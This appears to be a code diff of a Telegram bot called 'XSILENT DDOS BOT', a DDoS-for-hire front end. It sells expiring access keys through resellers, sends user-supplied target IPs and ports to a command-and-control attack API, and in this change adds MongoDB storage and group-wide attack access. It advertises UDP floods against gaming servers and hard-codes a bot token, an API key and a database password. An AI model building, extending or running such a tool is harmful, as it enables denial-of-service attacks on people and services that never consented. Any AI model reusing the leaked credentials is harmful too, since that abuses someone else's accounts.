@@ -10,55 +10,113 @@ import string
 import re
 from datetime import datetime, timedelta
 from collections import defaultdict
+from pymongo import MongoClient
 
 # ========== CONFIG ==========
-BOT_TOKEN = "8615300823:AAE4ajz8ZN9W2ZYLrh1C8JXV1wrd5qzjXyw"
+BOT_TOKEN = "8760406918:AAHk0XYSysz4nJElHEq4y7eIbIBqUL9Or3M"
 ADMIN_ID = ["8487946379"]
-USERS_FILE = "users.json"
-KEYS_FILE = "keys.json"
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
 API_KEY = "PFC10J"
 MAX_CONCURRENT = 2
 
+# ========== MONGODB CONNECTION ==========
+MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
+client = MongoClient(MONGO_URI)
+db = client["xsilent_bot"]
+users_collection = db["users"]
+keys_collection = db["keys"]
+groups_collection = db["groups"]
+settings_collection = db["settings"]
+
 # ========== DATA STRUCTURES ==========
 active_attacks = {}
 cooldown = {}
-keys_data = {}
+group_attack_times = {}
 
-# ========== FILE FUNCTIONS ==========
+# ========== LOAD DATA FROM MONGODB ==========
 def load_users():
-    try:
-        with open(USERS_FILE, 'r') as f:
-            return json.load(f)
-    except:
+    users_data = users_collection.find_one({"_id": "users"})
+    if not users_data:
+        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
         return {"users": [ADMIN_ID[0]], "resellers": []}
+    return users_data
 
 def load_keys():
-    try:
-        with open(KEYS_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        return {}
+    keys = {}
+    for key_data in keys_collection.find():
+        keys[key_data["key"]] = {
+            "user_id": key_data.get("user_id"),
+            "duration_value": key_data.get("duration_value"),
+            "duration_unit": key_data.get("duration_unit"),
+            "generated_by": key_data.get("generated_by"),
+            "generated_at": key_data.get("generated_at"),
+            "expires_at": key_data.get("expires_at"),
+            "used": key_data.get("used", False),
+            "used_by": key_data.get("used_by"),
+            "used_at": key_data.get("used_at")
+        }
+    return keys
 
 def save_users(data):
-    with open(USERS_FILE, 'w') as f:
-        json.dump(data, f)
+    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)
 
-def save_keys(data):
-    with open(KEYS_FILE, 'w') as f:
-        json.dump(data, f)
+def save_keys(keys_data):
+    keys_collection.delete_many({})
+    for key, info in keys_data.items():
+        keys_collection.insert_one({
+            "key": key,
+            "user_id": info.get("user_id"),
+            "duration_value": info.get("duration_value"),
+            "duration_unit": info.get("duration_unit"),
+            "generated_by": info.get("generated_by"),
+            "generated_at": info.get("generated_at"),
+            "expires_at": info.get("expires_at"),
+            "used": info.get("used", False),
+            "used_by": info.get("used_by"),
+            "used_at": info.get("used_at")
+        })
+
+def load_groups():
+    groups = {}
+    for group_data in groups_collection.find():
+        groups[group_data["group_id"]] = {
+            "attack_time": group_data.get("attack_time", 60),
+            "added_by": group_data.get("added_by"),
+            "added_at": group_data.get("added_at")
+        }
+    return groups
+
+def save_group(group_id, attack_time, added_by):
+    groups_collection.update_one(
+        {"group_id": group_id},
+        {"$set": {
+            "attack_time": attack_time,
+            "added_by": added_by,
+            "added_at": time.time()
+        }},
+        upsert=True
+    )
+
+def remove_group(group_id):
+    groups_collection.delete_one({"group_id": group_id})
+
+def get_group_attack_time(group_id):
+    group = groups_collection.find_one({"group_id": group_id})
+    if group:
+        return group.get("attack_time", 60)
+    return None
 
 users_data = load_users()
 users = users_data["users"]
 resellers = users_data.get("resellers", [])
 keys_data = load_keys()
+groups = load_groups()
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # ========== HELPER FUNCTIONS ==========
 def generate_key():
-    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
-    return key
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
 
 def parse_duration(duration_str):
     duration_str = duration_str.lower().strip()
@@ -70,16 +128,6 @@ def parse_duration(duration_str):
         hours = duration_str.replace('h', '')
         if hours.isdigit():
             return int(hours), "hour"
-    
-    if "hour" in duration_str:
-        hours = re.findall(r'\d+', duration_str)
-        if hours:
-            return int(hours[0]), "hour"
-    
-    if "day" in duration_str:
-        days = re.findall(r'\d+', duration_str)
-        if days:
-            return int(days[0]), "day"
     
     return None, None
 
@@ -170,13 +218,33 @@ def check_user_expiry(user_id):
                 return True
     return False
 
+def is_user_in_approved_group(user_id):
+    for group_id, group_info in groups.items():
+        try:
+            member = bot.get_chat_member(group_id, user_id)
+            if member.status in ["member", "administrator", "creator"]:
+                return group_id
+        except:
+            continue
+    return None
+
 # ========== COMMANDS ==========
 @bot.message_handler(commands=['start'])
 def start(msg):
     uid = str(msg.chat.id)
+    chat_type = msg.chat.type
+    
+    if chat_type == "group" or chat_type == "supergroup":
+        group_id = str(msg.chat.id)
+        attack_time = get_group_attack_time(group_id)
+        if attack_time:
+            bot.reply_to(msg, "🔥 XSILENT DDOS BOT - GROUP\n\n✅ Group Approved!\n⚡ Attack Time: " + str(attack_time) + "s\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
+        else:
+            bot.reply_to(msg, "❌ Group not approved! Contact owner to add this group.")
+        return
     
     if uid in ADMIN_ID:
-        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - OWNER\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/api_status")
+        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - OWNER\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status")
     elif uid in resellers:
         bot.reply_to(msg, "🔥 XSILENT DDOS BOT - RESELLER\n\n✅ Reseller Access\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys")
     elif uid in users:
@@ -188,12 +256,23 @@ def start(msg):
 @bot.message_handler(commands=['attack'])
 def attack(msg):
     uid = str(msg.chat.id)
+    chat_type = msg.chat.type
+    is_group = (chat_type == "group" or chat_type == "supergroup")
     
-    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
+    if is_group:
+        group_id = str(msg.chat.id)
+        attack_time_limit = get_group_attack_time(group_id)
+        if not attack_time_limit:
+            bot.reply_to(msg, "❌ Group not approved!")
+            return
+    else:
+        attack_time_limit = 300
+    
+    if uid not in users and uid not in ADMIN_ID and uid not in resellers and not is_group:
         bot.reply_to(msg, "❌ Unauthorized!")
         return
     
-    if uid not in ADMIN_ID and not check_user_expiry(uid):
+    if not is_group and uid not in ADMIN_ID and not check_user_expiry(uid):
         bot.reply_to(msg, "❌ Your access has expired!")
         return
     
@@ -202,27 +281,37 @@ def attack(msg):
         bot.reply_to(msg, "❌ Both attack slots are full!\nTotal active: " + str(total_active) + "/" + str(MAX_CONCURRENT) + "\nUse /status to check when a slot frees up")
         return
     
-    if uid in cooldown:
+    if uid in cooldown and not is_group:
         remaining = 30 - (time.time() - cooldown[uid])
         if remaining > 0:
             bot.reply_to(msg, "⏳ Wait " + str(int(remaining)) + " seconds!")
             return
     
     args = msg.text.split()
-    if len(args) != 4:
-        bot.reply_to(msg, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
-        return
-    
-    ip, port, duration = args[1], args[2], args[3]
+    if is_group:
+        if len(args) != 3:
+            bot.reply_to(msg, "Usage: /attack IP PORT\nExample: /attack 1.1.1.1 443")
+            return
+        ip, port = args[1], args[2]
+        duration = attack_time_limit
+    else:
+        if len(args) != 4:
+            bot.reply_to(msg, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
+            return
+        ip, port, duration = args[1], args[2], args[3]
+        try:
+            duration = int(duration)
+        except:
+            bot.reply_to(msg, "❌ Invalid time!")
+            return
     
     try:
         port = int(port)
-        duration = int(duration)
-        if duration < 10 or duration > 300:
-            bot.reply_to(msg, "❌ Duration 10-300 seconds!")
+        if duration < 10 or duration > attack_time_limit:
+            bot.reply_to(msg, "❌ Duration 10-" + str(attack_time_limit) + " seconds!")
             return
     except:
-        bot.reply_to(msg, "❌ Invalid port or time!")
+        bot.reply_to(msg, "❌ Invalid port!")
         return
     
     existing_attack = check_active_attack_by_target(ip, port)
@@ -231,7 +320,8 @@ def attack(msg):
         bot.reply_to(msg, "❌ TARGET UNDER ATTACK!\n\n🎯 " + ip + ":" + str(port) + " already being attacked\n👤 By: " + existing_attack['user'] + "\n⏰ Finishes in: " + str(remaining) + "s")
         return
     
-    cooldown[uid] = time.time()
+    if not is_group:
+        cooldown[uid] = time.time()
     
     attack_id = uid + "_" + str(int(time.time()))
     target_key = ip + ":" + str(port)
@@ -512,6 +602,63 @@ def remove_reseller(msg):
     except:
         pass
 
+@bot.message_handler(commands=['addgroup'])
+def add_group(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 3:
+        bot.reply_to(msg, "Usage: /addgroup GROUP_ID TIME\nExample: /addgroup -100123456789 60")
+        return
+    
+    group_id = args[1]
+    attack_time = int(args[2])
+    
+    if attack_time < 10 or attack_time > 300:
+        bot.reply_to(msg, "❌ Attack time must be between 10-300 seconds!")
+        return
+    
+    save_group(group_id, attack_time, uid)
+    
+    bot.reply_to(msg, "✅ GROUP ADDED!\n\n👥 Group ID: " + group_id + "\n⏱️ Attack Time: " + str(attack_time) + "s\n\nAll members can now use /attack IP PORT")
+
+@bot.message_handler(commands=['removegroup'])
+def remove_group_cmd(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "Usage: /removegroup GROUP_ID")
+        return
+    
+    group_id = args[1]
+    remove_group(group_id)
+    
+    bot.reply_to(msg, "✅ GROUP REMOVED!\nGroup ID: " + group_id)
+
+@bot.message_handler(commands=['allgroups'])
+def all_groups(msg):
+    if str(msg.chat.id) not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    group_list = []
+    for group_id, info in groups.items():
+        group_list.append("👥 " + group_id + "\n   ⏱️ " + str(info["attack_time"]) + "s\n   👑 " + info["added_by"])
+    
+    if group_list:
+        bot.reply_to(msg, "📋 ALL GROUPS:\n\n" + "\n".join(group_list) + "\n\nTotal: " + str(len(groups)))
+    else:
+        bot.reply_to(msg, "📋 No groups added yet!")
+
 @bot.message_handler(commands=['redeem'])
 def redeem(msg):
     uid = str(msg.chat.id)
@@ -635,12 +782,14 @@ def stop_attack(msg):
 @bot.message_handler(commands=['methods'])
 def methods(msg):
     uid = str(msg.chat.id)
+    chat_type = msg.chat.type
     
-    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
+    if chat_type == "group" or chat_type == "supergroup":
+        bot.reply_to(msg, "⚡ UDP AUTO ATTACK\n\n💡 Best for gaming\n🎯 Recommended ports: 443, 8080\n\nUSAGE:\n/attack IP PORT")
+    elif uid in users or uid in ADMIN_ID or uid in resellers:
+        bot.reply_to(msg, "⚡ UDP AUTO ATTACK\n\n💡 Best for gaming (BGMI, Minecraft)\n🎯 Recommended ports: 443, 8080, 14000\n\nUSAGE:\n/attack IP PORT TIME\n\nExample: /attack 1.1.1.1 443 60")
+    else:
         bot.reply_to(msg, "❌ Unauthorized!")
-        return
-    
-    bot.reply_to(msg, "⚡ UDP AUTO ATTACK\n\n💡 Best for gaming (BGMI, Minecraft)\n🎯 Recommended ports: 443, 8080, 14000\n\nUSAGE:\n/attack IP PORT TIME\n\nExample: /attack 1.1.1.1 443 60")
 
 @bot.message_handler(commands=['stats'])
 def stats(msg):
@@ -659,9 +808,12 @@ def stats(msg):
 @bot.message_handler(commands=['help'])
 def help_cmd(msg):
     uid = str(msg.chat.id)
+    chat_type = msg.chat.type
     
-    if uid in ADMIN_ID:
-        bot.reply_to(msg, "🔥 OWNER HELP\n\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/api_status")
+    if chat_type == "group" or chat_type == "supergroup":
+        bot.reply_to(msg, "🔥 GROUP HELP\n\n/attack IP PORT - Launch attack\n/help - This menu\n/start - Bot info")
+    elif uid in ADMIN_ID:
+        bot.reply_to(msg, "🔥 OWNER HELP\n\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status")
     elif uid in resellers:
         bot.reply_to(msg, "🔥 RESELLER HELP\n\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys")
     elif uid in users:
@@ -721,5 +873,8 @@ cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
 cleanup_thread.start()
 
 print("XSILENT BOT STARTED - Owner: 8487946379")
+print("MongoDB Connected - Groups Loaded: " + str(len(groups)))
 
 bot.infinity_polling()
+```
+        
